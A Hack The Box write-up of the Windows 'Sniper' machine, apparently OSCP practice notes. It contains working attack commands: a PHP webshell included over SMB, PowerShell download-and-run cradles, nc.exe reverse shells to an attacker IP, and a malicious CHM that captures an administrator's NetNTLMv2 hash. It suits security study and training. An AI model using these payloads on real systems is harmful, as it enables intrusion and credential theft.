# Sniper (HTB)

> Platform: Hack The Box  
> OS: Windows  
> Difficulty: Medium  
> Result: Administrator

---

## Attack Chain

```text
Reconnaissance
+-- nmap -p- -Pn -> 80 (IIS 10.0), 135, 139, 445, 49667
|-- gobuster -> /blog/ (PHP), /user/ (login + registration)

Foothold
|-- blog/?lang=/windows/win.ini -> local file inclusion
|-- impacket-smbserver + shell.php -> remote file inclusion
|-- whoami -> nt authority\iusr
+-- type C:\inetpub\wwwroot\user\db.php -> dbuser:<PASSWORD>

Lateral Movement
|-- Invoke-Command LOCALHOST as SNIPER\chris (password reuse)
|-- nc.exe -e cmd.exe -> shell as sniper\chris
+-- user.txt

Privilege Escalation
|-- C:\Docs\note.txt -> CEO expects a CHM in C:\Docs
|-- malicious instructions.chm with UNC -> Responder
|-- NetNTLMv2 SNIPER\Administrator -> hashcat 5600
|-- <PASSWORD> -> Invoke-Command as Administrator
+-- root.txt
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Windows Server 2019 running Microsoft IIS 10.0 with a PHP 7.3 blog. The blog loads its content through a GET parameter (`lang`) without validating the path, which allows both local and remote file inclusion. Remote inclusion over SMB gives a webshell as `NT AUTHORITY\iUSR`. The web root exposes a MySQL connection string (`db.php`); the database password is reused by the local user `chris`. From `chris`, a note in `C:\Docs` reveals the CEO reviews documentation in CHM format, which can be abused to capture the Administrator NetNTLMv2 hash and crack it.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate=5000 -T4 -Pn -n 10.129.229.6
```

```text
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
```

```bash
nmap -sC -sV -Pn -n -p80,135,139,445,49667 10.129.229.6
```

```text
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Directory Enumeration

```bash
gobuster dir -u http://10.129.229.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

```text
images   (Status: 301)
index.php (Status: 200)
blog     (Status: 301)
user     (Status: 301)
css      (Status: 301)
js       (Status: 301)
```

The `/blog/` directory is a PHP blog with a `lang` GET parameter, and `/user/` provides login and registration.
---

## Foothold

No CVE (custom vulnerability) - the blog app includes PHP files by user-supplied path in `lang`, allowing local and remote file inclusion.

### Local File Inclusion

Changing the blog language produces a URL like `/blog/?lang=blog-en.php`. The `lang` value is included directly by PHP. Absolute paths are accepted by the Windows PHP build, so there is no need for traversal sequences.

```bash
curl -s "http://10.129.229.6/blog/?lang=/windows/win.ini" | tail -12
```

```text
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### Remote File Inclusion over SMB

Windows PHP accepts UNC paths in `include()`. Serve a webshell over SMB and include it directly from the target.

```bash
mkdir -p /tmp/share
echo '<?php system($_GET["0"]); ?>' > /tmp/share/shell.php
impacket-smbserver share /tmp/share -smb2support
```

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=whoami" | tail -3
```

```text
nt authority\iusr
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Database Credentials

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=type%20C:%5Cinetpub%5Cwwwroot%5Cuser%5Cdb.php" | tail -12
```

```text
$con = mysqli_connect("localhost","dbuser","<PASSWORD>","sniper");
```

---

## Lateral Movement

### Password Reuse to chris

The web shell runs as a low-privileged IIS account. The database password is reused by the local user `chris`. WinRM is not exposed externally, but `Invoke-Command` against `LOCALHOST` still works from the web shell context.

```bash
cat > /tmp/www/test-chris.ps1 <<'EOF'
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('SNIPER\chris', $p)
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $c
EOF
```

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=powershell%20-c%20%22iex(New-Object%20Net.WebClient).DownloadString('http://10.10.15.129:8000/test-chris.ps1')%22" | tail -5
```

```text
sniper\chris
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Shell as chris

```bash
cat > /tmp/www/shell-chris.ps1 <<'EOF'
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('SNIPER\chris', $p)
Invoke-Command -ComputerName LOCALHOST -ScriptBlock {
  iwr http://10.10.15.129:8000/nc.exe -OutFile C:\Users\chris\nc.exe
  C:\Users\chris\nc.exe -e cmd.exe 10.10.15.129 4444
} -Credential $c
EOF
```

```bash
rlwrap nc -lvnp 4444
```

```bash
curl -s "http://10.129.229.6/blog/?lang=%5C%5C10.10.15.129%5Cshare%5Cshell.php&0=powershell%20-c%20%22iex(New-Object%20Net.WebClient).DownloadString('http://10.10.15.129:8000/shell-chris.ps1')%22" | tail -3
```

```text
C:\Users\Chris\Documents>
```

The user flag is at `C:\Users\chris\Desktop\user.txt`.

---

## Privilege Escalation

### Enumeration as chris

```text
C:\Users\Chris\Desktop>type C:\Docs\note.txt
Hi Chris,
  Your php skillz suck. Contact yamitenshi so that he teaches you how to use it
  and after that fix the website as there are a lot of bugs on it. And I hope
  that you have prepared the documentation for our new app. Drop it here when
  you are done with it.
Regards,
Sniper CEO.
```

The note says the CEO expects a CHM file dropped into `C:\Docs`. A CHM (Compiled HTML Help) opens in `hh.exe`, which renders HTML and will follow UNC references inside, causing Windows to authenticate to our SMB share.

### Building the Malicious CHM

Install a Linux CHM compiler:

```bash
sudo apt update && sudo apt install -y fp-utils
which chmcmd
```

```text
/usr/bin/chmcmd
```

Create the HTML source with a UNC `<img>` tag pointing at our listener:

```bash
mkdir -p /tmp/chm && cat > /tmp/chm/index.html <<'EOF'
<!DOCTYPE html>
<html><body>
<h1>New App Documentation</h1>
<img src="\\10.10.15.129\share\test.png" width="1" height="1">
</body></html>
EOF
```

```bash
cat > /tmp/chm/index.hhp <<'EOF'
[OPTIONS]
Compatibility=1.1 or later
Compiled file=instructions.chm
Contents file=index.hhp
Default topic=index.html
Display compile progress=No
Language=0x409 English (United States)

[FILES]
index.html
EOF
```

```bash
cd /tmp/chm && chmcmd index.hhp && cp instructions.chm /tmp/www/
```

```text
Writing CHM instructions.chm
```

### Capturing NetNTLMv2

```bash
sudo responder -I tun0 -v
```

Drop the CHM into `C:\Docs` from the `chris` shell:

```text
C:\Users\Chris\Desktop>powershell -c "iwr http://10.10.15.129:8000/instructions.chm -OutFile C:\Docs\instructions.chm"
C:\Users\Chris\Desktop>dir C:\Docs\instructions.chm
```

```text
10/26/2026  08:18 PM            10,817 instructions.chm
```

Responder captures the hash when the Administrator opens the file:

```text
[SMB] NTLMv2-SSP Client   : 10.129.229.6
[SMB] NTLMv2-SSP Username : SNIPER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::SNIPER:<NTLM_RESPONSE>:<SERVER_CHALLENGE>:<NTLM_BLOB>
```

### Cracking the Hash

```bash
hashcat -m 5600 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
```

```text
ADMINISTRATOR::SNIPER:...:<PASSWORD>
Status...........: Cracked
```

### Shell as Administrator

```bash
cat > /tmp/www/shell-admin.ps1 <<'EOF'
$p = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('SNIPER\Administrator', $p)
Invoke-Command -ComputerName LOCALHOST -ScriptBlock {
  C:\Users\chris\nc.exe -e cmd.exe 10.10.15.129 5555
} -Credential $c
EOF
```

```bash
rlwrap nc -lvnp 5555
```

Trigger from the `chris` shell:

```text
C:\Users\Chris\Desktop>powershell -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.15.129:8000/shell-admin.ps1')"
```

```text
C:\Users\Administrator\Documents>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value |
|------|-------|
| User | `<USER_FLAG>` |
| Root | `<ROOT_FLAG>` |

### Flag File

```text
C:\Users\chris\Desktop>type C:\Users\chris\Desktop\user.txt
<USER_FLAG>
```

```text
C:\Users\Administrator\Documents>type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

---

## Key Takeaways

- Absolute paths bypass traversal filters on Windows PHP builds; always test `lang=/windows/win.ini` in addition to `../../`.
- Remote file inclusion over SMB (`\\attacker\share\shell.php`) is often easier than session poisoning and works whenever Windows PHP accepts UNC paths.
- Credentials found in web application source (`db.php`) frequently reuse local account passwords. Always try the DB user password against local users.
- A leaked note or README can hint at a client-side execution path (CHM, LNK, Office). When a document folder is writable, a malicious CHM with a UNC reference captures NetNTLMv2.
- NetNTLMv2 (`hashcat -m 5600`) is fast to crack with rockyou when the password is weak. After cracking, `Invoke-Command` with a `PSCredential` gives a shell without needing WinRM exposed.
- Always take a screenshot of each stage: `whoami` after foothold, after lateral movement, and after privilege escalation - one per OSCP marker.
